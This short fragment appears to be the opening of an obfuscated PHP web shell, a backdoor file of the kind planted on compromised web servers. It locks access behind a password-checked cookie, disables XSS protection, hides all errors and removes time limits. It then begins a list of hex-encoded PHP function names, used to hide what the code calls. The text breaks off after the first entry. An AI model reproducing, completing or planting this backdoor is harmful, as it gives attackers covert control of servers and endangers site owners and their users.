<?php isset($_COOKIE['s']) and password_verify($_COOKIE['s'], '$2y$10$/y1zGZgSfazBPPt6WZ0kmeTP4CXbwrZfnRmgXpD92o1FyNEwtVOke') OR exit(); header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
$Array = [
		'7068705f756e616d65',
